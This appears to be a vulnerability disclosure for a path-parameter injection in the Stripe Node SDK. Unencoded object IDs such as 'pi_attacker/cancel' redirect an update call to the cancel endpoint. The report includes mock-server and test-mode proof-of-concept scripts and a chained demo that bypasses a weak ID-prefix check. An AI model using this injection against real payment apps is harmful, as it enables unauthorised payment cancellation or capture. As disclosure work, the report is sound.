# Vulnerability 1: Unencoded Path Parameter Injection in Generated Resource Methods
 
---
 
## A. Summary
 
An attacker-controlled Stripe object ID can escape its intended URL path segment and invoke a **different** Stripe API endpoint.
 
---
 
## B. Why It Is Exploitable
 
Generated methods splice IDs directly into template strings:
 
- **`PaymentIntents.ts` (line 77)** uses:
  ```ts
  /v1/payment_intents/${id}
  ```
- **`StripeResource._makeRequest`** forwards that path unchanged into the HTTP request at `StripeResource.ts` (line 124).
- The repo already has a URL interpolation helper that encodes path variables with `encodeURIComponent` in **`utils.ts` (line 143)**, but these generated methods **do not use it**.
---
 
## C. Real-World Impact
 
If an app exposes a "safe" operation like `stripe.paymentIntents.update(id, body)` and the attacker controls `id`, they can pass `pi_xxx/cancel` and turn it into:
 
```
POST /v1/payment_intents/pi_xxx/cancel
```
 
Stripe docs define `update` and `cancel` as **separate endpoints**:
- [Update PaymentIntent](https://docs.stripe.com/api/payment_intents/update)
- [Cancel PaymentIntent](https://docs.stripe.com/api/payment_intents/cancel)
This can cause:
- Unintended payment cancellation
- Capture/confirm endpoint access
- Subresource data exposure depending on the method
---
 
## D. Step-by-Step Reproduction
 
### Step 1 — Build Locally Without Changing Source
 
```bash
cd <dir>
yarn install --frozen-lockfile
./node_modules/.bin/tsc -p tsconfig.cjs.json
```
 
### Step 2 — Run a Local Mock Stripe API and Observe the Path
 
```bash
node <<'NODE'
const http = require('http');
const Stripe = require('./cjs/stripe.cjs.node.js');
 
const server = http.createServer((req, res) => {
  console.log(`${req.method} ${req.url}`);
  res.writeHead(200, {'content-type': 'application/json', 'request-id': 'req_test'});
  res.end(JSON.stringify({id: 'ok', object: 'payment_intent'}));
});
 
server.listen(4242, async () => {
  const stripe = Stripe('sk_test_dummy', {
    host: '127.0.0.1',
    port: 4242,
    protocol: 'http',
    maxNetworkRetries: 0,
  });
 
  await stripe.paymentIntents.update('pi_attacker/cancel', {
    cancellation_reason: 'abandoned',
  });
 
  server.close();
});
NODE
```
 
**Expected verification — the mock server prints:**
 
```
POST /v1/payment_intents/pi_attacker/cancel
```
 
That proves the `id` became path syntax instead of remaining a single encoded ID segment.
 
### Step 3 — Optional Safe Live Verification (Stripe Test Mode Only)
 
```js
const stripe = require('./cjs/stripe.cjs.node.js')(process.env.STRIPE_TEST_API_KEY);
 
const pi = await stripe.paymentIntents.create({
  amount: 1000,
  currency: 'usd',
});
 
await stripe.paymentIntents.update(`${pi.id}/cancel`, {
  cancellation_reason: 'abandoned',
});
 
const after = await stripe.paymentIntents.retrieve(pi.id);
console.log(after.status); // should show canceled if exploitable
```
 
---
 
## E. Exploit Chain Possibility
 
This chains well with weak app-side checks such as `id.startsWith("pi_")`, because `pi_xxx/cancel` still passes. If the app passes request JSON directly into SDK params, the attacker can choose parameters accepted by the unintended endpoint.
 
### Prerequisites — Make Sure `cjs/` Exists
 
```bash
yarn install --frozen-lockfile
./node_modules/.bin/tsc -p tsconfig.cjs.json
```
 
### Single-Command End-to-End PoC (Run from Repo Root)
 
```bash
node <<'NODE'
const http = require('http');
const Stripe = require('./cjs/stripe.cjs.node.js');
 
const stripeMock = http.createServer((req, res) => {
  console.log('[Stripe API received]', req.method, req.url);
  res.writeHead(200, {'content-type': 'application/json', 'request-id': 'req_test'});
  res.end(JSON.stringify({id: 'ok', object: 'payment_intent'}));
});
 
stripeMock.listen(4242, () => {
  const stripe = Stripe('sk_test_dummy', {
    host: '127.0.0.1',
    port: 4242,
    protocol: 'http',
    maxNetworkRetries: 0,
  });
 
  const vulnerableApp = http.createServer(async (req, res) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      const input = JSON.parse(body);
 
      // Common but weak application-side guard:
      // "Only allow PaymentIntent IDs"
      if (!input.id.startsWith('pi_')) {
        res.writeHead(400);
        return res.end('blocked');
      }
 
      console.log('[App check passed]', input.id);
 
      await stripe.paymentIntents.update(input.id, {
        cancellation_reason: input.cancellation_reason,
      });
 
      res.writeHead(200);
      res.end('ok');
 
      vulnerableApp.close();
      stripeMock.close();
    });
  });
 
  vulnerableApp.listen(8080, async () => {
    await fetch('http://127.0.0.1:8080/update-payment-intent', {
      method: 'POST',
      headers: {'content-type': 'application/json'},
      body: JSON.stringify({
        id: 'pi_attacker/cancel',
        cancellation_reason: 'abandoned'
      })
    });
  });
});
NODE
```
 
### Expected Output
 
```
[App check passed] pi_attacker/cancel
[Stripe API received] POST /v1/payment_intents/pi_attacker/cancel
```
 
### That Proves the Chain
 
1. App intended to allow only PaymentIntent update.
2. App's `id.startsWith("pi_")` validation passed.
3. The SDK converted the attacker's `id` into a different route.
4. Stripe receives `POST /v1/payment_intents/:id/cancel`, not the intended update route.
